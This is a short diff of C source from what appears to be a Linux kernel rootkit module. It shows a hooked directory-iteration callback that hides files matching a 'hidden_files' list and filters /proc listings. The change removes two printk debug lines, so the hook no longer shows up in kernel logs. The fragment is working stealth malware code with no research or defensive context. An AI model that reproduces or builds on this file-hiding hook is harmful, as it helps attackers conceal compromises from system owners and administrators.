@@ -249,7 +249,6 @@ static int new_actor(struct dir_context *ctx, const char *name, int namelen, lof
 
 	list_for_each_entry(entry, &hooked_dir_context_list, head) {
 	    if (entry->ctx == ctx) {
-	    	printk(KERN_INFO "Called hooked actor! %s", name);
 	        list_for_each_entry(hidden_file, &hidden_files, head) {
                 if (hidden_file->ino == entry->ino && !strcmp(name, hidden_file->file_name)) {
                     return 0;
@@ -261,7 +260,6 @@ static int new_actor(struct dir_context *ctx, const char *name, int namelen, lof
                         return 0;
                     }
                 }
-	            printk(KERN_INFO "Called proc iterate!");
 	        }
 	        return entry->prev_actor(ctx, name, namelen, off, ino, type);
 	    }
